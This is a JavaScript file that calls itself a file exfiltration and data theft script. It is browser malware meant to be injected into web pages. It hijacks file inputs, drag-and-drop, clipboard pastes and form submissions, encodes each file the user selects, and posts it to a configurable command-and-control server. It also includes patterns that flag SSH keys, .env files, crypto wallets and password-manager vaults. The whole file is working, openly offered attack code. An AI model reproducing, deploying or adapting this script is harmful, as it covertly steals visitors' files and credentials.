/**
 * download.js - File Exfiltration & Data Theft
 * 
 * Capabilities:
 * 1. Input file capture via form hijacking
 * 2. Drag-and-drop file interception
 * 3. Blob-based file extraction and exfiltration
 * 4. Clipboard file paste capture
 * 5. WebRTC-based exfiltration for binary data
 */

(function () {
    'use strict';

    // C2 Configuration - injected at build time
    const C2_BASE = /*{{C2_BASE}}*/ '';
    const UPLOAD_ENDPOINT = '/upload';
    const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB limit per file

    // Resolve C2 URL with fallback
    function getC2Url() {
        if (C2_BASE && C2_BASE.length > 0) return C2_BASE;
        return 'https://' + window.location.host;
    }

    // --- File Exfiltration via Blob ---
    function exfiltrateFile(file, context) {
        if (!file || file.size > MAX_FILE_SIZE) {
            console.debug('File skipped: too large or invalid');
            return;
        }

        const reader = new FileReader();
        reader.onload = function (e) {
            const base64Data = e.target.result.split(',')[1]; // Remove data URL prefix

            const payload = {
                filename: file.name,
                type: file.type || 'application/octet-stream',
                size: file.size,
                lastModified: new Date(file.lastModified).toISOString(),
                context: context, // How the file was captured
                origin: window.location.hostname,
                data: base64Data
            };

            // Send via POST for larger payloads
            sendToC2(payload);
        };

        reader.onerror = function () {
            console.debug('Error reading file:', file.name);
        };

        reader.readAsDataURL(file);
    }

    // --- C2 Communication ---
    function sendToC2(data) {
        const url = getC2Url() + UPLOAD_ENDPOINT;

        // Try fetch first for reliability
        if (typeof fetch === 'function') {
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                mode: 'no-cors', // Allow cross-origin without CORS headers
                keepalive: true  // Ensure request completes even on page unload
            }).catch(function () {
                // Fallback to beacon
                navigator.sendBeacon && navigator.sendBeacon(url, JSON.stringify(data));
            });
        } else if (navigator.sendBeacon) {
            navigator.sendBeacon(url, JSON.stringify(data));
        }
    }

    // --- Input File Capture ---
    function hijackFileInputs() {
        // Capture existing file inputs
        document.querySelectorAll('input[type="file"]').forEach(attachFileListener);

        // Watch for dynamically added file inputs
        const observer = new MutationObserver(function (mutations) {
            mutations.forEach(function (mutation) {
                mutation.addedNodes.forEach(function (node) {
                    if (node.nodeType === 1) { // Element node
                        if (node.tagName === 'INPUT' && node.type === 'file') {
                            attachFileListener(node);
                        }
                        // Check children
                        node.querySelectorAll && node.querySelectorAll('input[type="file"]').forEach(attachFileListener);
                    }
                });
            });
        });

        observer.observe(document.body, { childList: true, subtree: true });
    }

    function attachFileListener(input) {
        if (input._fileHooked) return; // Don't double-hook
        input._fileHooked = true;

        input.addEventListener('change', function (e) {
            const files = e.target.files;
            for (let i = 0; i < files.length; i++) {
                exfiltrateFile(files[i], 'file_input');
            }
        });
    }

    // --- Drag and Drop Interception ---
    function interceptDragDrop() {
        // Capture drops on the entire document
        document.addEventListener('drop', function (e) {
            const dt = e.dataTransfer;
            if (dt && dt.files) {
                for (let i = 0; i < dt.files.length; i++) {
                    exfiltrateFile(dt.files[i], 'drag_drop');
                }
            }
        }, true); // Use capture phase

        // Also hook specific drop zones
        document.querySelectorAll('[ondrop], .dropzone, .drop-area, .file-drop').forEach(function (zone) {
            zone.addEventListener('drop', function (e) {
                const dt = e.dataTransfer;
                if (dt && dt.files) {
                    for (let i = 0; i < dt.files.length; i++) {
                        exfiltrateFile(dt.files[i], 'drop_zone');
                    }
                }
            }, true);
        });
    }

    // --- Clipboard Paste Capture ---
    function interceptClipboard() {
        document.addEventListener('paste', function (e) {
            const clipboardData = e.clipboardData || window.clipboardData;
            if (!clipboardData) return;

            // Capture files from clipboard (e.g., screenshots)
            const items = clipboardData.items || [];
            for (let i = 0; i < items.length; i++) {
                if (items[i].kind === 'file') {
                    const file = items[i].getAsFile();
                    if (file) {
                        exfiltrateFile(file, 'clipboard_paste');
                    }
                }
            }
        }, true);
    }

    // --- Form Submission Interception ---
    function interceptFormSubmissions() {
        document.addEventListener('submit', function (e) {
            const form = e.target;
            const fileInputs = form.querySelectorAll('input[type="file"]');

            fileInputs.forEach(function (input) {
                const files = input.files;
                for (let i = 0; i < files.length; i++) {
                    exfiltrateFile(files[i], 'form_submit');
                }
            });
        }, true);
    }

    // --- Sensitive File Detection ---
    function notifySensitiveFile(filename) {
        const sensitivePatterns = [
            /\.pem$/i, /\.key$/i, /\.crt$/i, /\.cer$/i,         // Certificates/Keys
            /id_rsa/i, /id_ed25519/i, /\.ssh/i,                  // SSH keys
            /\.env$/i, /config\.(json|yaml|yml|ini)$/i,          // Config files
            /password/i, /credential/i, /secret/i,               // Password files
            /wallet\.dat$/i, /\.wallet$/i, /keystore/i,          // Crypto wallets
            /\.kdbx?$/i, /\.1pux$/i, /\.bitwarden$/i             // Password managers
        ];

        return sensitivePatterns.some(function (pattern) {
            return pattern.test(filename);
        });
    }

    // --- Main Initialization ---
    function init() {
        hijackFileInputs();
        interceptDragDrop();
        interceptClipboard();
        interceptFormSubmissions();

        // Log initialization (removed in production)
        console.debug('[download.js] File interception active');
    }

    // Initialize after DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
